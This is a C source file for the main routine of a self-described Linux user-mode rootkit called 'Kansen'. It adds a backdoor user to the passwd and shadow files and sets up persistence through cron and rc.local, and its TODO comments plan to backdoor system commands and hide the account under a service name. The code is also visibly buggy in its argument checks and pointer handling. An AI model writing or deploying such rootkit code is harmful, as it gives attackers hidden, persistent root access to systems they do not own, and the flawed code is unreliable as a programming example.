#include <stdio.h>
#include <stdlib.h>

#include "headers/adduser.h"
#include "headers/cron.h"
#include "headers/rclocal.h"

//
//Kansen User mode rootkit "Ring 3".
//WRITTEN FOR EDUCATIONAL PURPOSES
//
//Written for linux devices, to be ran as root user
//
//TODO: write to infect linux commands, possibly recompiling and placing the commands, with a backdoor? [idea]
//TODO: Add cron usage
//TODO: mask user under service name
//TODO: write a seperate binary to be compiled for adding the logins, to be referenced to in init.d

int main(int argc, char *argv[]) {
    //passhash gnereated using openssl
    //openssl passwd -1
    //./kansei "username" "passhash"

#ifdef DEBUG
    printf("Kansei Has started\n");
#endif

    if(argc != 2) {
#ifdef DEBUG
        printf("Usage: ./%s 'username' 'passwd'", argv[0]);
#endif
    }
    
    if(add_user_passwd(*argv[1]) != 0) {
#ifdef DEBUG
        printf("Proceeding to shadow\n");
#endif
    }

    if(add_user_shadow(*argv[1], *argv[2]) != 0) {
#ifdef DEBUG
        printf("Proceeding to place entry cron entrys\n");
#endif
    }

    if(cron_entry(*argv[1], argv[2]) != 0) {
#ifdef DEBUG
        printf("Proceeding to rclocal entry\n");
#endif
    }

    if(rc_local_entry() != 0) {
#ifdef DEBUG
        printf("Proceeding to compile, and organize shit\n");
#endif
    }
    

    return 9;
}